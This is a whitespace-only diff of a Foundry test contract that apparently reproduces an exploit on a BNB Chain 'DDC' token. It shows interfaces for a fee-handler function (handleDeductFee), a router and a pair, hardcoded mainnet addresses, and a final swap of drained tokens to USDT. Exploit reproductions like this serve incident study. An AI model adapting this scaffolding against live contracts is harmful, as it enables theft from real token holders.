@@ -4,20 +4,27 @@ import "forge-std/Test.sol";
 //import "./../interface.sol";
 
 interface CheatCodes {
+
     function createSelectFork(string calldata, uint256) external returns (uint256);
+
 }
 
 interface IERC20 {
+
     function balanceOf(address owner) external view returns (uint256);
     function approve(address spender, uint256 value) external returns (bool);
     function transfer(address to, uint256 value) external returns (bool);
+
 }
 
 interface ITokenAFeeHandler is IERC20 {
+
     function handleDeductFee(uint8 actionType, uint256 feeAmount, address from, address user) external;
+
 }
 
 interface IRouter {
+
     function swapExactTokensForTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -32,13 +39,17 @@ interface IRouter {
         address to,
         uint256 deadline
     ) external;
+
 }
 
 interface IPair {
+
     function sync() external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IRouter TargetRouter = IRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
@@ -80,4 +91,5 @@ contract ContractTest is Test {
         path[1] = address(USDT);
         TargetRouter.swapExactTokensForTokens(DDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);
     }
+
 }
